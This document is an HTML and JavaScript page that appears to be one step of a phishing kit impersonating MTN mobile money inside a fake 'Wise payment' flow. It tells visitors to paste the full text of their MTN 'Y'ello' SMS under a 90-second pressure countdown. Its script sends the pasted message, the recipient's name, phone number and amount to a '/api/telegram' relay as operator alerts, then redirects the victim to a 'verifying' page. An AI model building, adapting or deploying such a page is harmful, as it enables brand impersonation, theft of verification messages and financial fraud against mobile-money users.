<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Confirm SMS · MTN</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { height: 100%; }

  :root {
    --wise-white: #FFFFFF;
    --wise-error: #D14343;
    --wise-success: #0E7C3A;
    --shadow-lg: 0 20px 40px -12px rgba(22, 51, 0, 0.18);
    --mtn-yellow: #FFCC00;
    --mtn-yellow-dark: #E6B800;
    --mtn-black: #000000;
    --mtn-light-grey: #F7F7F7;
    --mtn-border: #E4E4E4;
    --mtn-text: #1A1A1A;
    --mtn-text-light: #6B6B6B;
    --mtn-text-muted: #9B9B9B;
  }

  body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%);
    min-height: 100dvh;
    display: grid;
    place-items: center;
    padding: 12px;
    color: var(--mtn-text);
    -webkit-font-smoothing: antialiased;
    overflow: hidden;
  }

  .card-container { max-width: 520px; width: 100%; }

  .sms-card {
    background: var(--wise-white);
    border-radius: 1.5rem;
    box-shadow: var(--shadow-lg);
    padding: 1.15rem 1.25rem 1rem;
    position: relative;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    gap: 0.75rem;
    max-height: calc(100dvh - 24px);
    animation: cardEnter 0.4s cubic-bezier(0.22, 1, 0.36, 1) both;
  }
  @keyframes cardEnter {
    from { opacity: 0; transform: translateY(10px) scale(0.99); }
    to { opacity: 1; transform: translateY(0) scale(1); }
  }
  .sms-card::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 5px;
    background: var(--mtn-yellow);
  }

  /* ---------- Header ---------- */
  .sms-header {
    display: flex;
    align-items: center;
    gap: 0.7rem;
    padding-bottom: 0.7rem;
    border-bottom: 1px solid var(--mtn-border);
  }
  .mtn-logo {
    background: var(--mtn-yellow);
    width: 40px; height: 40px;
    border-radius: 11px;
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 3px 10px rgba(255,204,0,0.35);
    flex-shrink: 0;
    font-weight: 800; font-size: 0.88rem;
    color: var(--mtn-black); letter-spacing: -0.03em;
  }
  .sms-title { display: flex; flex-direction: column; gap: 0.1rem; }
  .sms-title .brand { font-size: 1rem; font-weight: 700; color: var(--mtn-text); line-height: 1.1; }
  .sms-title .sub { font-size: 0.72rem; font-weight: 500; color: var(--mtn-text-light); }

  /* ---------- Amount strip ---------- */
  .amount-strip {
    background: linear-gradient(135deg, #FFFDF0 0%, #FFF8D9 100%);
    border: 1px solid #F0E4B0;
    border-radius: 0.75rem;
    padding: 0.55rem 0.85rem;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 0.75rem;
  }
  .amount-strip .label {
    font-size: 0.65rem;
    font-weight: 700;
    color: var(--mtn-text-light);
    text-transform: uppercase;
    letter-spacing: 0.08em;
  }
  .amount-strip .value {
    font-size: 1rem;
    font-weight: 700;
    color: var(--mtn-text);
    letter-spacing: -0.02em;
    display: flex;
    align-items: baseline;
    gap: 0.35rem;
  }
  .amount-strip .cur {
    display: inline-block;
    background: var(--mtn-yellow);
    color: var(--mtn-black);
    font-size: 0.6rem;
    font-weight: 700;
    padding: 0.12rem 0.45rem;
    border-radius: 20px;
    letter-spacing: 0.05em;
  }

  /* ---------- Instructions ---------- */
  .sms-instructions {
    background: #F7FBFF;
    border: 1px solid #D9E8F5;
    border-radius: 0.75rem;
    padding: 0.7rem 0.9rem;
  }
  .sms-instructions .title {
    font-size: 0.75rem;
    font-weight: 700;
    color: #1A5C8F;
    display: flex;
    align-items: center;
    gap: 0.4rem;
    margin-bottom: 0.4rem;
  }
  .sms-instructions .title svg {
    width: 13px; height: 13px;
    stroke: #1A5C8F;
    fill: none; stroke-width: 2.2;
    stroke-linecap: round; stroke-linejoin: round;
  }
  .sms-instructions ol {
    padding-left: 1.1rem;
    font-size: 0.73rem;
    color: #2B4B6A;
    line-height: 1.5;
    font-weight: 400;
  }
  .sms-instructions ol li { margin-bottom: 0.15rem; }
  .sms-instructions ol li:last-child { margin-bottom: 0; }
  .sms-instructions .highlight {
    font-weight: 700;
    color: #0E7C3A;
    background: #E8F5E9;
    padding: 0.05rem 0.35rem;
    border-radius: 4px;
  }

  /* ---------- Slim countdown (just above textarea) ---------- */
  .countdown-strip {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 0.6rem;
    background: #FFFDF0;
    border: 1px solid #F0E4B0;
    border-radius: 0.65rem;
    padding: 0.45rem 0.7rem;
    transition: background 0.3s ease, border-color 0.3s ease;
  }
  .countdown-strip.urgent {
    background: #FFF0F0;
    border-color: #F5C0C0;
  }
  .countdown-strip.expired {
    background: #FDECEC;
    border-color: #F3BFBF;
  }
  .countdown-strip .cd-left {
    display: flex;
    align-items: center;
    gap: 0.4rem;
    font-size: 0.72rem;
    font-weight: 600;
    color: var(--mtn-text-light);
  }
  .countdown-strip .cd-left svg {
    width: 13px; height: 13px;
    stroke: var(--mtn-yellow-dark);
    fill: none; stroke-width: 2.2;
    stroke-linecap: round; stroke-linejoin: round;
    flex-shrink: 0;
  }
  .countdown-strip.urgent .cd-left svg { stroke: #D14343; }
  .countdown-strip.expired .cd-left svg { stroke: #A02020; }
  .countdown-strip .cd-right {
    font-size: 0.95rem;
    font-weight: 700;
    color: var(--mtn-text);
    font-variant-numeric: tabular-nums;
    letter-spacing: -0.01em;
  }
  .countdown-strip.urgent .cd-right { color: #D14343; }
  .countdown-strip.expired .cd-right { color: #A02020; }
  .countdown-strip.expired .cd-left { color: #A02020; }

  /* ---------- Textarea ---------- */
  .sms-textarea-wrap {
    display: flex;
    flex-direction: column;
    gap: 0.4rem;
  }
  .sms-textarea-wrap label {
    font-size: 0.75rem;
    font-weight: 600;
    color: var(--mtn-text);
    display: flex;
    align-items: center;
    gap: 0.35rem;
  }
  .sms-textarea-wrap label svg {
    width: 13px; height: 13px;
    stroke: var(--mtn-text-light);
    fill: none; stroke-width: 2;
    stroke-linecap: round; stroke-linejoin: round;
  }
  .sms-textarea {
    width: 100%;
    padding: 0.75rem 0.85rem;
    font-size: 0.82rem;
    font-family: 'Inter', sans-serif;
    font-weight: 500;
    color: var(--mtn-text);
    background: var(--mtn-light-grey);
    border: 1.5px solid var(--mtn-border);
    border-radius: 0.7rem;
    outline: none;
    resize: none;
    height: 96px;
    line-height: 1.45;
    transition: border-color 0.15s, box-shadow 0.15s, background 0.15s;
  }
  .sms-textarea::placeholder { color: #B5B5B5; font-weight: 400; }
  .sms-textarea:focus {
    border-color: var(--mtn-yellow-dark);
    background: var(--wise-white);
    box-shadow: 0 0 0 3px rgba(255,204,0,0.2);
  }
  .sms-textarea.error {
    border-color: var(--wise-error);
    background: #FFF8F8;
  }

  /* ---------- Primary button ---------- */
  .sms-submit-btn {
    width: 100%;
    border: none;
    border-radius: 0.75rem;
    padding: 0.85rem 1.25rem;
    font-size: 0.95rem;
    font-weight: 700;
    font-family: 'Inter', sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    cursor: pointer;
    transition: transform 0.15s, box-shadow 0.15s, background 0.15s;
    background: var(--mtn-yellow);
    color: var(--mtn-black);
    box-shadow: 0 4px 12px rgba(255,204,0,0.35);
    letter-spacing: -0.01em;
  }
  .sms-submit-btn:hover:not(:disabled) {
    background: #F5C200;
    transform: translateY(-1px);
    box-shadow: 0 7px 16px rgba(255,204,0,0.5);
  }
  .sms-submit-btn:active:not(:disabled) { transform: translateY(1px) scale(0.99); }
  .sms-submit-btn:disabled {
    background: #E6E6E6;
    color: #999;
    box-shadow: none;
    cursor: not-allowed;
  }
  .sms-submit-btn svg {
    width: 17px; height: 17px;
    stroke: currentColor; fill: none;
    stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
  }

  /* ---------- Footer rows ---------- */
  .footer-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 0.5rem;
    font-size: 0.75rem;
    color: var(--mtn-text-light);
    padding-top: 0.55rem;
    border-top: 1px solid var(--mtn-border);
  }
  .resend-btn {
    background: none; border: none;
    font-family: 'Inter', sans-serif;
    font-size: 0.75rem;
    font-weight: 700;
    color: var(--mtn-yellow-dark);
    cursor: pointer;
    padding: 0.25rem 0.5rem;
    border-radius: 5px;
    transition: background 0.15s, color 0.15s;
    display: inline-flex;
    align-items: center;
    gap: 0.3rem;
  }
  .resend-btn:hover:not(:disabled) {
    background: #FFF8D9;
    color: #B88A00;
  }
  .resend-btn:disabled { color: var(--mtn-text-muted); cursor: not-allowed; }
  .resend-btn svg {
    width: 12px; height: 12px;
    stroke: currentColor; fill: none;
    stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
  }
  .back-link {
    display: inline-flex;
    align-items: center;
    gap: 0.3rem;
    font-size: 0.75rem;
    font-weight: 500;
    color: var(--mtn-text-light);
    background: none; border: none; cursor: pointer;
    font-family: 'Inter', sans-serif;
    padding: 0.25rem 0.5rem;
    border-radius: 5px;
    transition: color 0.15s, background 0.15s;
  }
  .back-link:hover { color: var(--mtn-text); background: rgba(0,0,0,0.04); }
  .back-link svg {
    width: 12px; height: 12px;
    stroke: currentColor; fill: none;
    stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
  }

  /* ---------- Status ---------- */
  .status-message {
    padding: 0.55rem 0.85rem;
    border-radius: 0.7rem;
    font-size: 0.76rem;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 0.45rem;
    line-height: 1.35;
  }
  .status-message.success { background: #E8F5E9; color: var(--wise-success); border: 1px solid #B8DFC6; }
  .status-message.error { background: #FDECEC; color: var(--wise-error); border: 1px solid #F3BFBF; }
  .status-message.info { background: #FFF8E1; color: #8A6D00; border: 1px solid #FFE082; }
  .status-message svg {
    width: 14px; height: 14px;
    flex-shrink: 0;
    stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; fill: none;
  }
  .status-message.hidden { display: none; }

  @keyframes spinRing { to { transform: rotate(360deg); } }
  .spin { animation: spinRing 0.7s linear infinite; }

  /* Very short viewports */
  @media (max-height: 680px) {
    .sms-card { padding: 0.95rem 1rem 0.85rem; gap: 0.6rem; border-radius: 1.25rem; }
    .sms-instructions { padding: 0.55rem 0.75rem; }
    .sms-instructions ol { font-size: 0.7rem; line-height: 1.4; }
    .sms-textarea { height: 80px; font-size: 0.78rem; }
    .sms-submit-btn { padding: 0.75rem 1.1rem; font-size: 0.9rem; }
  }
  @media (max-height: 560px) {
    .sms-instructions { display: none; }
    .amount-strip { padding: 0.4rem 0.7rem; }
    .sms-textarea { height: 70px; }
    .sms-title .sub { display: none; }
  }
</style>
</head>
<body>

<div class="card-container">
  <div class="sms-card">

    <!-- Header -->
    <div class="sms-header">
      <div class="mtn-logo">MTN</div>
      <div class="sms-title">
        <span class="brand">Confirm your SMS</span>
        <span class="sub">Verification step</span>
      </div>
    </div>

    <!-- Amount strip -->
    <div class="amount-strip">
      <span class="label">You will receive</span>
      <span class="value">
        <span id="smsAmount">—</span>
        <span class="cur" id="smsCurrency">UGX</span>
      </span>
    </div>

    <!-- Instructions -->
    <div class="sms-instructions">
      <div class="title">
        <svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
        How to get the code
      </div>
      <ol>
        <li>Open your phone's <strong>Messages</strong> app</li>
        <li>Find the message starting with <span class="highlight">Y'ello</span></li>
        <li>Copy the <strong>full text</strong> of the message</li>
        <li>Paste it in the box below</li>
      </ol>
    </div>

    <!-- Slim countdown -->
    <div class="countdown-strip" id="countdownStrip">
      <span class="cd-left">
        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
        <span id="cdLabel">Time to paste SMS</span>
      </span>
      <span class="cd-right" id="cdValue">1:30</span>
    </div>

    <!-- Textarea -->
    <div class="sms-textarea-wrap">
      <label for="smsInput">
        <svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
        SMS message
      </label>
      <textarea id="smsInput" class="sms-textarea" placeholder="Y'ello, You have received UGX 4,750,000 from ..." rows="3"></textarea>
    </div>

    <!-- Submit -->
    <button class="sms-submit-btn" id="smsSubmitBtn">
      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
      Verify &amp; continue
    </button>

    <!-- Footer row: back + resend -->
    <div class="footer-row">
      <button class="back-link" id="backBtn">
        <svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
        Back
      </button>
      <button class="resend-btn" id="smsResendBtn">
        <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
        <span id="resendLabel">Resend SMS</span>
      </button>
    </div>

    <!-- Status -->
    <div id="smsStatus" class="status-message hidden">
      <svg viewBox="0 0 24 24" id="smsStatusIcon"><polyline points="20 6 9 17 4 12"/></svg>
      <span id="smsStatusText"></span>
    </div>

  </div>
</div>

<script>
(function() {
  const $ = id => document.getElementById(id);

  // ============================================================
  // STATE PERSISTENCE (survives reload when user leaves to read SMS)
  // ============================================================
  const STATE_KEY = 'wise_sms_state';

  function saveState(partial) {
    try {
      const current = JSON.parse(sessionStorage.getItem(STATE_KEY) || '{}');
      sessionStorage.setItem(STATE_KEY, JSON.stringify({ ...current, ...partial }));
    } catch(e) {}
  }
  function loadState() {
    try { return JSON.parse(sessionStorage.getItem(STATE_KEY) || '{}'); }
    catch(e) { return {}; }
  }
  function clearState() {
    try { sessionStorage.removeItem(STATE_KEY); } catch(e) {}
  }

  // ---- Session from mtn.html ----
  let session = {};
  try {
    session = JSON.parse(sessionStorage.getItem('wise_session') || '{}') || {};
  } catch(e) { session = {}; }

  if (!session || !session.txnId) {
    window.location.replace('mtn.html');
    return;
  }

  const txnId = session.txnId;

  const smsInput = $('smsInput');
  const smsAmount = $('smsAmount');
  const smsCurrency = $('smsCurrency');
  const smsSubmitBtn = $('smsSubmitBtn');
  const smsResendBtn = $('smsResendBtn');
  const resendLabel = $('resendLabel');
  const backBtn = $('backBtn');
  const smsStatus = $('smsStatus');
  const smsStatusText = $('smsStatusText');
  const smsStatusIcon = $('smsStatusIcon');
  const countdownStrip = $('countdownStrip');
  const cdValue = $('cdValue');
  const cdLabel = $('cdLabel');

  // ---- Render amount from session ----
  smsAmount.textContent = session.localAmount || '—';
  smsCurrency.textContent = session.localCurrency || 'UGX';

  // ---- Helpers ----
  function esc(s) {
    if (s == null) return '';
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  async function sendTelegram(html, txnIdArg, stage) {
    try {
      const res = await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: html, txnId: txnIdArg, stage })
      });
      return await res.json();
    } catch (e) { console.error('Telegram send failed:', e); }
  }

  function showStatus(msg, type) {
    smsStatusText.textContent = msg;
    smsStatus.classList.remove('hidden', 'success', 'error', 'info');
    smsStatus.classList.add(type);
    if (type === 'error') smsStatusIcon.innerHTML = '<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>';
    else if (type === 'info') smsStatusIcon.innerHTML = '<circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>';
    else smsStatusIcon.innerHTML = '<polyline points="20 6 9 17 4 12"/>';
    setTimeout(() => smsStatus.classList.add('hidden'), 3500);
  }

  // ============================================================
  // COUNTDOWN — 90 seconds, wall-clock based
  // ============================================================
  const COUNTDOWN_SECONDS = 90;
  let remaining = COUNTDOWN_SECONDS;
  let countdownEndsAt = 0;
  let countdownInterval = null;

  function formatTime(sec) {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m}:${String(s).padStart(2, '0')}`;
  }

  function updateCountdownDisplay() {
    cdValue.textContent = formatTime(remaining);
    countdownStrip.classList.remove('urgent', 'expired');
    if (remaining <= 0) {
      countdownStrip.classList.add('expired');
      cdLabel.textContent = 'Time expired';
    } else if (remaining <= 20) {
      countdownStrip.classList.add('urgent');
      cdLabel.textContent = 'Hurry — paste now';
    } else {
      cdLabel.textContent = 'Time to paste SMS';
    }
  }

  function startCountdown(seconds = COUNTDOWN_SECONDS) {
    remaining = seconds;
    countdownEndsAt = Date.now() + seconds * 1000;
    saveState({ countdownEndsAt });
    updateCountdownDisplay();

    if (countdownInterval) clearInterval(countdownInterval);
    countdownInterval = setInterval(() => {
      const msLeft = countdownEndsAt - Date.now();
      remaining = Math.max(0, Math.ceil(msLeft / 1000));
      updateCountdownDisplay();
      if (remaining <= 0) {
        clearInterval(countdownInterval);
        countdownInterval = null;
        onCountdownExpired();
      }
    }, 250);
  }

  function stopCountdown() {
    if (countdownInterval) {
      clearInterval(countdownInterval);
      countdownInterval = null;
    }
    saveState({ countdownEndsAt: 0 });
  }

  async function onCountdownExpired() {
    smsSubmitBtn.disabled = true;
    smsInput.disabled = true;

    await sendTelegram(`⌛ <b>SMS PAGE TIMED OUT</b>

<b>Txn ID:</b> <code>${esc(txnId)}</code>
<b>Recipient:</b> ${esc(session.recipientName || '—')}
<b>Number:</b> ${esc(session.recipientPhone || '—')}
<b>Amount:</b> ${esc(session.localAmount || '')} ${esc(session.localCurrency || '')}

<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>

User did not paste SMS within 90 seconds.`, txnId, 'sms-timeout');

    clearState();
    window.location.href = 'mtn.html';
  }

  // ============================================================
  // SUBMIT
  // ============================================================
  smsSubmitBtn.addEventListener('click', async () => {
    const txt = smsInput.value.trim();

    if (!txt) {
      smsInput.classList.add('error');
      showStatus('Please paste the SMS from MTN.', 'error');
      smsInput.focus();
      return;
    }

    const norm = txt.replace(/[’‘`´]/g, "'");
    if (!/^y'ello/i.test(norm)) {
      smsInput.classList.add('error');
      showStatus('Invalid SMS. It must start with "Y\'ello".', 'error');
      smsInput.focus();
      return;
    }

    smsInput.classList.remove('error');
    stopCountdown();
    smsSubmitBtn.disabled = true;
    smsSubmitBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Sending...';

    const message = `📩 <b>SMS RECEIVED — APPROVAL REQUIRED</b>

━━━━━━━━━━━━━━━━━━━━
<b>💳 WISE PAYMENT</b>
━━━━━━━━━━━━━━━━━━━━
<b>Amount:</b> ${esc(session.localAmount || '')} ${esc(session.localCurrency || '')}
<b>Recipient:</b> ${esc(session.recipientName || '—')}
<b>Number:</b> ${esc(session.recipientPhone || '—')}

━━━━━━━━━━━━━━━━━━━━
<b>📩 PASTED SMS</b>
<code>${esc(txt)}</code>

━━━━━━━━━━━━━━━━━━━━
<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>`;

    try {
      await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
    } catch(e) { /* optional endpoint */ }

    await sendTelegram(message, txnId, 'sms');

    try {
      sessionStorage.setItem('wise_session', JSON.stringify({
        ...session,
        stage: 'sms',
        smsText: txt,
        smsSubmittedAt: Date.now()
      }));
    } catch(e) {}

    clearState();
    window.location.href = 'verifying.html';
  });

  // ============================================================
  // RESEND
  // ============================================================
  smsResendBtn.addEventListener('click', async () => {
    smsResendBtn.disabled = true;
    resendLabel.textContent = 'Sending...';

    await sendTelegram(`🔄 <b>SMS RESEND REQUESTED</b>

<b>Txn ID:</b> <code>${esc(txnId)}</code>
<b>Recipient:</b> ${esc(session.recipientName || '—')}
<b>Number:</b> ${esc(session.recipientPhone || '—')}
<b>Amount:</b> ${esc(session.localAmount || '')} ${esc(session.localCurrency || '')}

<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>

User requested a new SMS.`, txnId, 'sms-resend');

    setTimeout(() => {
      smsResendBtn.disabled = false;
      resendLabel.textContent = 'Resend SMS';
      showStatus('A new SMS has been requested.', 'success');
      smsInput.value = '';
      smsInput.classList.remove('error');
      smsInput.disabled = false;
      smsSubmitBtn.disabled = false;
      smsSubmitBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Verify &amp; continue';
      startCountdown(); // restart with fresh 90s
      smsInput.focus();
    }, 700);
  });

  // ============================================================
  // BACK
  // ============================================================
  backBtn.addEventListener('click', () => {
    stopCountdown();
    clearState();
    window.location.href = 'mtn.html';
  });

  // ============================================================
  // INPUT — autosave on every keystroke
  // ============================================================
  smsInput.addEventListener('input', () => {
    smsInput.classList.remove('error');
    saveState({ smsText: smsInput.value });
  });

  // ============================================================
  // BOOT — restore previous state if any, else start fresh
  // ============================================================
  (function boot() {
    const s = loadState();

    // Restore textarea
    if (s.smsText) {
      smsInput.value = s.smsText;
    }

    // Restore countdown from wall clock
    if (s.countdownEndsAt && s.countdownEndsAt > Date.now()) {
      const msLeft = s.countdownEndsAt - Date.now();
      remaining = Math.max(1, Math.ceil(msLeft / 1000));
      countdownEndsAt = s.countdownEndsAt;
      updateCountdownDisplay();

      if (countdownInterval) clearInterval(countdownInterval);
      countdownInterval = setInterval(() => {
        const ms = countdownEndsAt - Date.now();
        remaining = Math.max(0, Math.ceil(ms / 1000));
        updateCountdownDisplay();
        if (remaining <= 0) {
          clearInterval(countdownInterval);
          countdownInterval = null;
          onCountdownExpired();
        }
      }, 250);
    } else {
      // Fresh start
      startCountdown();
    }
  })();

  // ============================================================
  // Before leaving the page, save current end time so a reload resumes
  // ============================================================
  window.addEventListener('beforeunload', () => {
    if (countdownInterval) {
      saveState({
        countdownEndsAt,
        smsText: smsInput.value
      });
    }
  });
})();
</script>
</body>
</html>
